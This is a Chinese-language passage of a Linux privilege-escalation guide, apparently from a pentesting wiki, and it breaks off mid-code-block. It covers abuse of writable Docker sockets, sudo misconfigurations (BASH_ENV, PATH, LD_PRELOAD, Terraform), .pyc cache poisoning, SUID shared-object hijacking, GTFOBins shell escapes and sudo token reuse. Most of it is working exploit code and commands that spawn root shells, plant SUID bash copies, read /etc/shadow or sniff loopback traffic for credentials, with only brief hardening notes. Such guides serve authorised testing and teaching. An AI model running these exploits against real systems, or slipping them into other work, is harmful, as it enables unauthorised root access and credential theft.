### 可写套接字

如果你**识别出任何可写套接字**（_这里讨论的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你可以与该套接字通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能存在一些**监听 HTTP**请求的**套接字**（_我说的不是 .socket 文件，而是充当 Unix 套接字的文件_）。你可以使用以下命令进行检查：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
如果该 socket **响应 HTTP** 请求，那么你就可以与其**通信**，并可能**利用某些漏洞**。

### 可写入的 Docker Socket

Docker socket 通常位于 `/var/run/docker.sock`，是一个应当受到保护的关键文件。默认情况下，`root` 用户和 `docker` 组成员可以写入该文件。拥有此 socket 的写入权限可能导致权限提升。下面将介绍如何实现这一点，以及在 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 进行权限提升**

如果你拥有 Docker socket 的写入权限，可以使用以下命令提升权限：<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些 commands 允许你运行一个 container，以 root 级别访问 host 的 file system。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以通过 Unix socket 使用原始 HTTP 滥用 Docker socket。最可靠的流程是：

- 创建一个长期运行的 helper container，并将 host root bind-mounted 到其中
- 启动它
- 在该 helper 中创建一个 `exec` instance
- 启动该 `exec` instance，并通过 API 读取输出

**列出 Docker 镜像**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**创建并启动辅助容器**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**创建一个 exec 实例**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**启动 exec 实例并读取输出**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
这种模式通常比手动使用 `socat` 或 `nc -U` 驱动 `attach` 更可靠。一旦你能够使用 `/:/host` 创建 helper，就可以使用额外的 `exec` 实例读取 `/host/root/...` 等文件、在 `/host/root/.ssh` 下添加 SSH keys，或修改主机启动文件。

### 其他

请注意，如果你因为**属于 `docker` 组**而对 docker socket 具有写权限，那么你还有[**更多提权方式**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 正在某个端口上监听**，你也可能能够 compromise 它](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下页面中查看**更多逃逸容器，或滥用容器 runtime 进行提权的方法**：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为你**可能能够滥用它来提权**：


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为你**可能能够滥用它来提权**：


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一种复杂的**进程间通信（IPC）系统**，支持应用程序高效地交互和共享数据。它针对现代 Linux 系统设计，为不同形式的应用程序通信提供了一个健壮的框架。<sup>[[16]](#references)</sup>

该系统具有很强的通用性，支持可增强进程间数据交换的基本 IPC，类似于**增强版 UNIX domain sockets**。此外，它还支持广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth daemon 发出有关来电的信号后，可以促使 music player 静音，从而提升用户体验。另外，D-Bus 还支持 remote object system，简化应用程序之间的服务请求和方法调用，使原本复杂的流程更加顺畅。

D-Bus 采用**允许/拒绝模型**，根据匹配 policy rules 的累积效果管理消息权限（method calls、signal emissions 等）。这些 policies 规定了与 bus 的交互方式，攻击者可能通过利用这些权限实现提权。

例如，`/etc/dbus-1/system.d/wpa_supplicant.conf` 中就有这样一条 policy，其中详细规定了 root user 对 `fi.w1.wpa_supplicant1` 的 own、send 和 receive message 权限。

未指定 user 或 group 的 policies 将普遍适用，而 `"default"` context policies 则适用于所有未被其他特定 policies 覆盖的对象。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**了解如何在此处枚举和利用 D-Bus 通信：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并确定该机器所处的位置总是很有意思。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### 出站过滤快速分诊

如果主机可以运行命令，但 callback 失败，请快速区分 DNS、传输、代理和路由过滤：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 开放端口

在访问机器之前，始终检查该机器上运行的、你此前无法与之交互的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
按绑定目标对 listeners 进行分类：

- `0.0.0.0` / `[::]`：在所有本地 interfaces 上暴露。
- `127.0.0.1` / `::1`：仅限本地访问（适合作为 tunnel/forward 候选）。
- 特定内部 IP（例如 `10.x`、`172.16/12`、`192.168.x`、`fe80::`）：通常只能从内部网段访问。

### Local-only service triage 工作流

当你 compromise 一台主机后，绑定到 `127.0.0.1` 的 services 通常会首次从你的 shell 中变得可访问。一个快速的本地工作流是：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS 作为 network scanner（仅 network 模式）

除了本地 PE 检查外，LinPEAS 还可以作为专用的 network scanner 运行。它会使用 `$PATH` 中可用的二进制文件（通常为 `fping`、`ping`、`nc`、`ncat`），不会安装任何工具。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
如果在没有使用 `-t` 的情况下传递 `-d`、`-p` 或 `-i`，linPEAS 将作为纯网络扫描器运行（跳过其余的权限提升检查）。

### Sniffing

检查是否可以嗅探流量。如果可以，你可能能够抓取一些凭据。
```
timeout 1 tcpdump
```
快速实用检查：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) 在 post-exploitation 阶段尤其有价值，因为许多仅限内部访问的服务会在其中暴露 tokens/cookies/credentials：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
现在捕获，稍后解析：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 用户

### 通用枚举

检查你是**谁**、拥有哪些**权限**、系统中有哪些**用户**、哪些用户可以**登录**，以及哪些用户拥有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提升权限。更多信息见：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
使用以下命令**利用该漏洞**：**`systemd-run -t /bin/bash`**

### Groups

检查你是否是某个**组的成员**，该组可能授予你 root 权限：


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查剪贴板中是否包含任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道**该环境中的任何**密码**，请尝试使用该密码**登录每个用户**。

### Su Brute

如果你不介意制造大量噪声，并且计算机上存在 `su` 和 `timeout` 二进制文件，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 对用户进行 brute-force。\
带有 `-a` 参数的 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 也会尝试对用户进行 brute-force。

## 可写 PATH 滥用

### $PATH

如果你发现可以**写入 $PATH 中的某个目录**，则可能通过**在该可写目录中创建 backdoor** 来提升权限：使用某个命令的名称，而该命令将由其他用户（理想情况下是 root）执行，并且该命令**不是从 $PATH 中位于你的可写目录之前的目录加载的**。

### SUDO 和 SUID

你可能被允许使用 sudo 执行某些命令，或者这些命令可能具有 suid bit。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
某些**意外的命令允许你读取和/或写入文件，甚至执行命令。**<sup>[[8]](#references)</sup>例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以其他用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在此示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在可以通过将 ssh key 添加到 root 目录，或调用 `sh`，轻松获取 shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例**基于 HTB 机器 Admirer**，**存在 PYTHONPATH hijacking 漏洞**，可在以 root 身份执行脚本时加载任意 Python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-允许的 Python 导入中的可写 `__pycache__` / `.pyc` poisoning

如果一个 **sudo-允许的 Python script** 导入的 module 所在 package directory 包含一个**可写的 `__pycache__`**，你可能可以替换缓存的 `.pyc`，并在下一次导入时以 privileged user 身份执行 code。<sup>[[30]](#references)</sup>

- 原理：
- CPython 将 bytecode cache 存储在 `__pycache__/module.cpython-<ver>.pyc` 中。<sup>[[31]](#references)</sup>
- interpreter 会验证 **header**（magic + 与 source 关联的 timestamp/hash metadata），然后执行该 header 后存储的 marshaled code object。
- 如果你可以因为 directory 可写而**删除并重新创建**缓存文件，那么即使 `.pyc` 由 root 拥有且不可写，也仍然可以将其替换。
- 典型路径：
- `sudo -l` 显示一个你可以以 root 身份运行的 Python script 或 wrapper。
- 该 script 从 `/opt/app/`、`/usr/local/lib/...` 等位置导入 local module。
- 被导入 module 的 `__pycache__` directory 对你的 user 或所有人可写。

快速枚举：
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
如果你可以检查特权脚本，请识别其导入的模块及其缓存路径：<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
滥用流程：

1. 运行一次允许通过 sudo 执行的脚本，以便 Python 在缓存文件不存在时创建合法的缓存文件。
2. 从合法的 `.pyc` 中读取前 16 个字节，并在被投毒的文件中复用它们。
3. 编译一个 payload code object，对其执行 `marshal.dumps(...)`，删除原始缓存文件，然后使用原始 header 加上恶意 bytecode 重新创建该文件。
4. 再次运行允许通过 sudo 执行的脚本，使 import 以 root 身份执行你的 payload。

重要注意事项：

- 复用原始 header 至关重要，因为 Python 会将缓存元数据与源文件进行校验，而不会检查 bytecode 主体是否真正匹配源文件。
- 当源文件由 root 所有且不可写，但其所在的 `__pycache__` 目录可写时，这种方式尤其有用。
- 如果特权进程使用 `PYTHONDONTWRITEBYTECODE=1`、从权限安全的位置进行 import，或移除 import path 中所有目录的写权限，攻击将失败。

最小 proof-of-concept 结构：
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
加固：

- 确保特权 Python import path 中没有任何目录可被低权限用户写入，包括 `__pycache__`。
- 对于特权运行，考虑设置 `PYTHONDONTWRITEBYTECODE=1`，并定期检查意外可写的 `__pycache__` 目录。
- 对待可写的本地 Python modules 和可写的 cache 目录时，应采用与对待由 root 执行的可写 shell scripts 或 shared libraries 相同的方式。

### 通过 sudo env_keep 保留 BASH_ENV → root shell

如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），则可以利用 Bash 的非交互式启动行为，在调用允许的命令时以 root 身份运行任意代码。<sup>[[24]](#references)</sup>

- 工作原理：对于非交互式 shell，Bash 会评估 `$BASH_ENV`，并在运行目标 script 之前 source 该文件。许多 sudo 规则允许运行某个 script 或 shell wrapper。如果 sudo 保留了 `BASH_ENV`，你的文件就会以 root 权限被 source。<sup>[[23]](#references)</sup>

- 要求：
- 一条可运行的 sudo 规则（任何会以非交互方式调用 `/bin/bash` 的目标，或任何 bash script）。
- `BASH_ENV` 存在于 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC：
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 从 `env_keep` 中移除 `BASH_ENV`（以及 `ENV`），优先使用 `env_reset`。
- 避免为 sudo 允许执行的命令使用 shell wrappers；使用最小化的 binaries。
- 当使用保留的环境变量时，考虑启用 sudo I/O logging 和告警。

### 通过 sudo 执行 Terraform，并保留 HOME（!env_reset）

如果 sudo 保持环境不变（`!env_reset`），同时允许执行 `terraform apply`，那么 `$HOME` 仍然指向调用用户的目录。因此，Terraform 会以 root 身份加载 **$HOME/.terraformrc**，并遵循 `provider_installation.dev_overrides`。<sup>[[25]](#references)</sup>

- 将所需的 provider 指向一个可写目录，并放置一个以该 provider 命名的 malicious plugin（例如：`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 会在 Go plugin handshake 阶段失败，但会在终止前以 root 身份执行 payload，从而留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 验证绕过

Terraform 变量可以通过 `TF_VAR_<name>` 环境变量提供；当 sudo 保留环境时，这些变量仍然存在。诸如 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱验证，可以通过 symlink 绕过：<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform 会解析符号链接，并将真实的 `/root/root.txt` 复制到攻击者可读取的目标位置。通过预先创建目标符号链接，也可以使用相同的方法向特权路径**写入**内容（例如，将 provider 的目标路径指向 `/etc/cron.d/` 内部）。

### requiretty / !requiretty

在一些较旧的发行版中，sudo 可以通过 `requiretty` 进行配置，强制 sudo 只能从交互式 TTY 中运行。如果设置了 `!requiretty`（或未设置该选项），则可以从 reverse shells、cron jobs 或 scripts 等非交互式上下文中执行 sudo。
```bash
Defaults !requiretty
```
这本身不是一个直接的 vulnerability，但它扩大了无需完整 PTY 即可滥用 sudo rules 的情况。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH`，或显示包含 attacker-writable entries（例如 `/home/<user>/bin`）的 `secure_path`，则 sudo-allowed target 中的任何 relative command 都可能被 shadowed。<sup>[[3]](#references)</sup>

- 要求：存在一条 sudo rule（通常为 `NOPASSWD`），运行一个调用 commands 且未使用 absolute paths（`free`、`df`、`ps` 等）的 script/binary，并且存在一个会被优先搜索的 writable PATH entry。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**跳转**以读取其他文件或使用 **symlinks**。例如在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **通配符**（\*），就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

如果将 **sudo 权限**授予单个命令但**未指定路径**：_hacker10 ALL= (root) less_，则可以通过修改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果 **suid** binary **执行另一个命令时未指定其路径（始终使用** _**strings**_ **检查可疑 SUID binary 的内容）**，也可以使用此 technique。

[用于执行的 Payload 示例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### 带命令路径的 SUID binary

如果 **suid** binary **执行另一个命令时指定了路径**，那么你可以尝试创建一个以该命令命名的 **function**，然后将其导出。

例如，如果一个 suid binary 调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建并导出该 function：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用该 suid binary 时，此函数将被执行

### 由 SUID wrapper 执行的可写脚本

一种常见的 custom-app 配置错误是：由 root 拥有的 SUID binary wrapper 执行一个脚本，而该脚本本身可被低权限用户写入。

典型模式：
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
快速检查：
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
此攻击路径在 `/usr/local/bin` 中提供的“maintenance”/“backup” wrappers 里尤其常见。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable 用于指定一个或多个 shared libraries（.so files），由 loader 在其他所有 libraries（包括标准 C library（`libc.so`））之前加载。此过程称为 preloading a library。

但是，为了维护 system security 并防止此功能遭到利用，尤其是针对 **suid/sgid** executables，system 会强制执行以下条件：

- 对于 real user ID (_ruid_) 与 effective user ID (_euid_) 不匹配的 executables，loader 会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的 executables，只有位于 standard paths 且本身也带有 suid/sgid 的 libraries 才会被 preload。

如果你能够使用 `sudo` 执行 commands，且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD** 语句，则可能发生 privilege escalation。此配置允许 **LD_PRELOAD** environment variable 持久存在，并在使用 `sudo` 运行 commands 时仍被识别，从而可能以 elevated privileges 执行 arbitrary code。<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，通过运行 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，也可以滥用类似的 privesc，因为他可以控制搜索库的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明可能存在可利用之处。

要利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。

使用以下命令将上述 C 文件编译为共享对象（.so）文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应触发 exploit，从而可能导致 system compromise。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到一个会从我们可写入的文件夹加载 library 的 SUID binary，现在就在该文件夹中使用必要的名称创建这个 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果遇到类似以下错误
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的 library 需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix 二进制文件列表，攻击者可以利用其中的程序绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 与之类似，但适用于你**只能注入参数**到命令中的情况。

该项目收集了 Unix 二进制文件中可被滥用的合法功能，用于逃逸受限 shell、提升或维持提升后的权限、传输文件、生成 bind shell 和 reverse shell，以及辅助完成其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，则可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 检查它是否能找到利用某条 sudo 规则的方法。

### Reusing Sudo Tokens

在你拥有 **sudo 访问权限**但没有密码的情况下，可以通过**等待 sudo 命令执行，然后劫持会话 token** 来提升权限。<sup>[[18]](#references)</sup>

提升权限的要求：

- 你已经拥有用户 "_sampleuser_" 的 shell
- "_sampleuser_" 在**最近 15 分钟内使用过 `sudo`**（默认情况下，这就是 sudo token 的有效时长，在此期间我们可以使用 `sudo` 而无需输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可访问（你应能够上传它）

（你可以使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或者永久修改 `/etc/sysctl.d/10-ptrace.conf`，并设置 `kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**你可以使用以下工具提升权限：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **第一个 exploit**（`exploit.sh`）将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以使用它**在当前会话中激活 sudo token**（不会自动获得 root shell，请执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit**（`exploit_v2.sh`）将在 _/tmp_ 中创建一个由 root 所有且带有 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit**（`exploit_v3.sh`）将**创建一个 sudoers 文件**，使 **sudo tokens 永久有效，并允许所有用户使用 sudo**
```bash
